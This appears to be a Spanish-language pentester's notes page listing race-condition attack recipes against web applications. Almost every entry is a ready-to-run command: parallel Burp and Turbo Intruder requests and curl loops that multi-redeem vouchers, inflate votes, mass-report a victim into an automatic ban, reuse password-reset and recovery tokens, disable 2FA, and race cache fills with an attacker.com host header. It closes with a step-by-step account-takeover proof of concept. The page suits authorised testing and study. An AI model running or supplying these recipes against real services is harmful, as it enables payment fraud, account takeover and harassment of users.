---
aliases:
  - Race Specific Targets
  - Promo Race
  - Voting Race
  - Password Reset Race
tags:
  - type/technique
  - vuln/race-condition
  - technique/initial-access
  - technique/privilege-escalation
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: Technique
linked:
  - '[[Race Conditions]]'
---
# Race Conditions - Vectores Específicos

***

## Multi-Endpoint Races (Chains)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Burp parallel: `POST /cart/checkout` + `DELETE /cart/item/X` | Item shipped sin cobrar | Cross-endpoint TOCTOU. |
| Burp parallel: `POST /admin/grant?user=me&role=admin` + `DELETE /admin/role?user=me` | Permission state confusion | Admin endpoint race. |
| Burp parallel: `POST /upload` + `GET /file/list?filter=*.php` | Pre-scan listing post-upload | Upload + list race. |
| Burp parallel: `POST /login` + `POST /logout` con same session | Session limbo state | Auth race. |
| Burp parallel: `POST /subscription/upgrade` + `POST /subscription/cancel` | Tier confusion | Subscription state race. |
| Burp parallel: `POST /refund?order=X` + chargeback simulation via test mode | Double-refund | Payment processor race. |
| Burp parallel: `POST /vote/up?post=X` + `DELETE /post/X` | Orphan vote en deleted post | Cross-content race. |
| Generic A→B chain en Turbo Intruder: `engine.queue(setStateA); engine.queue(readStateA)` × N | Universal pattern | Cross-endpoint state share. |
^race-vector-multi-endpoint

___

## Promo Code / Voucher Redemption

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Burp Repeater group `POST /api/promo {"code":"PROMO50"}` × 100, "Send group in parallel" | Multi-redeem single-use voucher | Voucher 1-time-use. |
| Turbo Intruder con 100 concurrent redemption requests al mismo code | Stock overrun | Stock limitado. |
| `for i in {1..50}; do curl -X POST -b "$C" -d '{"code":"BIRTHDAY2025"}' https://target/api/gift/redeem & done; wait` | Multi-redeem birthday gift annual | Per-year limit race. |
| Burp parallel: `POST /api/discount {"code":"X","item":1}` × 10 | Stack discount múltiples veces sobre same item | Discount stack race. |
| Burp parallel: `POST /api/cashback {"transaction":"abc"}` × 100 | Multi-credit cashback claim | One-per-tx limit race. |
| `for i in {1..50}; do curl -X POST -b "$C" -d '{"action":"earn"}' https://target/api/loyalty/points & done; wait` | Loyalty point overrun | Point earn race. |
^race-vector-voucher

___

## Voting / Rating Manipulation

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `for i in {1..100}; do curl -X POST -b "$C" https://target/api/like/post/123 & done; wait` | Multi-like single user → counter += 100 | Like counter race. |
| Burp parallel: `POST /api/rate {"item":123,"rating":5}` × 100 same user | Rating fraud — average skewed | Star rating race. |
| Turbo Intruder con 200 concurrent `POST /poll/vote {"option":"X"}` same user | Poll manipulation | One-vote-per-user race. |
| `for i in {1..50}; do curl -X POST -b "$C" -d '{"reason":"abuse","target":"victim"}' https://target/api/report & done; wait` | Multi-report → auto-ban victim | Report abuse race. |
| Burp parallel: `POST /api/petition/sign {"petition":1}` × 100 same user | Petition signature fraud | Single-signature race. |
| Burp parallel: `POST /api/follow {"user":"X"}` × 100 | Follower count manipulation | Follow race. |
^race-vector-voting

___

## Account Takeover via Password Reset Race

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Burp parallel: `POST /password/reset {"token":"$T","new_password":"x"}` × 100 con stolen T | Reset token reuse | Token mark-used race. |
| Burp parallel: `POST /password/reset {"token":"$T","new_password":"X"}` × 5 con tokens distintos | Multiple resets same account | Multi-token race. |
| Burp parallel: `POST /email/confirm {"token":"$T"}` × 100 | Email change confirm reuse | Confirm race. |
| Burp parallel: `POST /account/merge?with=$VICTIM` + race con confirm endpoint | Hostile merge bypass victim confirm | Account merge race. |
| Burp parallel: `POST /2fa/disable` + `POST /2fa/disable/confirm` × 50 | 2FA disable race | MFA weakening. |
| Burp parallel: `POST /password/change {"old":"X","new":"Y"}` × 100 con wrong old | Race set new sin verify old | Password change race. |
| Burp parallel: `POST /recovery/use {"code":"$CODE"}` × 50 | Recovery code reuse | Single-use recovery race. |
^race-vector-ato

### PoC ATO via reset race

```
1. Atacante request password reset for victim@target.com
   → Token T enviado al email víctima

2. Atacante intercepta T (MITM / SDT / OAuth chain / OOB)

3. Burp Repeater group con N requests:
   POST /password/reset
   {"token":"T","new_password":"attacker_pass"}

4. "Send group in parallel (single connection)"

5. Race: server marks T used, pero múltiples reset-completion
   requests leen T como aún valid → multiple resets succeed

6. Atacante login con attacker_pass → ATO
```

___

## Cache Fill Race

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Burp parallel: `GET /api/x?cb=$(date +%s)` × 100 con same cache-busting key | Cache stampede / single-flight bypass | Cache miss. |
| Turbo Intruder: `engine.queue(legitGET); engine.queue(poisonedGET)` × N en parallel | Race poison durante cache fill | Cache fill race. |
| `curl -H "X-Forwarded-Host: attacker.com" https://target/?cb=$(date +%s)` × 50 parallel | Race poisoned variant | Cache fill + HHI combo. |
| Trigger cache TTL expire + flood concurrent: `for i in {1..100}; do curl -H "Cache-Control: no-cache" https://target/x & done; wait` | Stampede backend overload | TTL window race. |
| Burp parallel: `PURGE /api/x` + `GET /api/x` (read inmediato post-purge) | Read stale post-invalidation | Cache invalidation race. |
^race-vector-cache

***
